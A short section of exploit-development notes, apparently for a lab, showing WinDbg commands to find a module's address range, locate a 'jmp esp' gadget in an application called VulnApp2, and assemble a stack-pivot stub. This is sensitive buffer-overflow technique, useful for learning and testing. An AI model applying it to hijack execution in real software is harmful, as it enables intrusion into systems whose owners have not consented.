### Finding `jmp esp`

Find the address space of module

```text
lm
start    end        module name
14800000 14816000   vulnerable (no symbols)
61f50000 61fa8000   fwpuclnt   (deferred)
61fc0000 61fc8000   rasadhlp   (deferred)
63480000 6348e000   winrnr     (deferred)
634d0000 63561000   DNSAPI     (deferred)
63570000 63586000   NLAapi     (deferred)
63590000 635a0000   wshbth     (deferred)
635a0000 635b6000   pnrpnsp    (deferred)
...
```

Find `jmp esp` in

```text
0:005> s -b 0x14800000 0x14816000 ff e4
1480113d  ff e4 83 7d ec 00 75 03-58 5b c3 5b 8b e5 5d c3  ...}..u.X[.[..].
0:005> u 0x1480113d L3
VulnApp2+0x113d:
1480113d ffe4            jmp     esp
1480113f 837dec00        cmp     dword ptr [ebp-14h],0
14801143 7503            jne     VulnApp2+0x1148 (14801148)
```

Find an opcode

```text
0:003> a esp
0227ff78 sub esp, 40
0227ff7b jmp esp
0227ff7d
0:003> db esp L5
0227ff78  83 ec 40 ff e4
```
